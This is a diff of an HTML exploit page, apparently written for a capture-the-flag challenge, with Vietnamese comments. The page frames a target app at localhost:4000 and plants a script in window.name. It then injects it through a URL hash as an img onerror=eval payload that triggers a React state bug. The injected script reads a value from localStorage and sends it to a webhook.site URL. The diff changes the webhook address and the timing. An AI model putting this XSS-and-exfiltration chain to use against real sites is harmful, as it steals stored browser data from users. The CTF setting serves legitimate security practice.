@@ -1,34 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit Live Art</title>
+    <title>Exploit Safe Mode</title>
 </head>
 <body>
     <iframe src="about:blank" id="exploitFrame" style="width: 10px; height: 500px; border: none;"></iframe>
 
     <script>
-        // BƯỚC 1: Điền URL Webhook.site của bạn để nhận Flag ở đây
-        const EXFIL_SERVER = "https://webhook.site/44c1ef5d-0e8b-448f-ab3e-c1bc03d425f0"; 
-        
-        // BƯỚC 2: Bắt buộc giữ nguyên localhost:4000 vì Bot lưu trữ Flag tại đây
+        const EXFIL_SERVER = "https://webhook.site/0a84fa24-d4f3-4e1c-8ef0-42cd755a0922"; 
         const TARGET_SERVER = "http://localhost:4000"; 
 
         const frame = document.getElementById("exploitFrame");
 
-        // Ghi mã độc vào thuộc tính window.name của iframe để giữ lại sau khi chuyển hướng sang domain khác
-        // Chuỗi payload phẳng, không chứa ký tự xuống dòng hay dấu backtick phức tạp để tránh lỗi cú pháp
         frame.contentWindow.name = "const flag = localStorage.getItem('username'); if (flag) { new Image().src = '" + EXFIL_SERVER + "/?flag=' + encodeURIComponent(flag); }";
 
-        // BƯỚC 3: Chuyển hướng iframe tới đường dẫn đích chứa lỗi kèm tham số Hash độc hại
+        // Tăng từ 2 giây lên 4 giây để đảm bảo khung iframe ổn định và nạp xong URL ban đầu
         setTimeout(function() {
             frame.src = TARGET_SERVER + "/drawing/pwn#src=none&onerror=eval(window.name)&is=img";
-        }, 2000);
+        }, 4000);
 
-        // BƯỚC 4: Phóng to kích thước iframe lên 1200px để kích hoạt sự kiện resize động trong React
-        // Việc này ép xảy ra lỗi State Teleportation, nạp payload từ Hash URL vào thẻ <img>
+        // Tăng từ 5 giây lên 10 giây để chắc chắn React đã dựng xong hoàn chỉnh cây Virtual DOM,
+        // sau đó mới tung đòn quyết định thay đổi kích thước để "dịch chuyển" trạng thái Hook.
         setTimeout(function() {
             frame.style.width = "1200px";
-        }, 5000);
+        }, 10000);
     </script>
 </body>
 </html>
